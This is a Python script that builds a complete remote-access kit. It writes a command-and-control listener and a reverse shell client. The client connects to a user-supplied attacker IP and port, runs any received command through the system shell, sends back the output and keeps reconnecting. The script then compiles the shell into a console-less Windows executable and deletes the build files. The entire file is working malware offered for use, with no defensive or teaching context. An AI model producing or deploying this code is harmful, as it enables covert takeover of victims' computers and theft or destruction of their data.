import os
import shutil
import subprocess

def create_scripts(ip, port):
    c2_content = f"""import socket

LISTEN_IP = "{ip}"
LISTEN_PORT = {port}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((LISTEN_IP, LISTEN_PORT))
s.listen(1)

print(f"[*] Listening on {{LISTEN_PORT}}...")
conn, addr = s.accept()
print(f"[+] Connection from {{addr}}")

while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        conn.send(b"exit")
        break
    conn.send(command.encode())
    response = conn.recv(4096).decode()
    print(response)
conn.close()
"""
    
    shell_content = f"""import socket
import subprocess
import os
import sys
import time

ATTACKER_IP = "{ip}"
ATTACKER_PORT = {port}

def connect():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break
                elif command.startswith("cd "):
                    try:
                        os.chdir(command[3:].strip())
                        s.send(b"Changed directory.\\n")
                    except Exception as e:
                        s.send(str(e).encode() + b"\\n")
                else:
                    try:
                        output = subprocess.run(command, shell=True, capture_output=True)
                        s.send(output.stdout + output.stderr)
                    except Exception:
                        s.send(b"Command execution failed.\\n")
        except Exception:
            time.sleep(5)  # Wait before reconnecting
        finally:
            s.close()

connect()
"""
    
    with open("c2.py", "w") as file:
        file.write(c2_content)
    with open("shell.py", "w") as file:
        file.write(shell_content)
    
    print("[+] Scripts c2.py and shell.py successfully created!")

def build_executables():
    print("[+] Building executables...")
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "shell.py"], check=True)
    subprocess.run(["pyinstaller", "--onefile", "--console", "c2.py"], check=True)
    
    shutil.move("dist/shell.exe", "shell.exe")
    shutil.move("dist/c2.exe", "c2.exe")
    
    cleanup()
    print("[+] Build completed and cleaned up!")

def cleanup():
    print("[+] Cleaning up build files...")
    shutil.rmtree("build", ignore_errors=True)
    shutil.rmtree("dist", ignore_errors=True)
    os.remove("shell.spec")
    os.remove("c2.spec")
    os.remove("shell.py")
    os.remove("c2.py")
    print("[+] Cleanup done!")

ip = input("Enter listener IP: ")
port = input("Enter listener PORT: ")
    
try:
    port = int(port)
    if not (1 <= port <= 65535):
        raise ValueError
except ValueError:
    print("[-] Invalid port number! Must be between 1-65535.")
    exit()
    
create_scripts(ip, port)
build_executables()
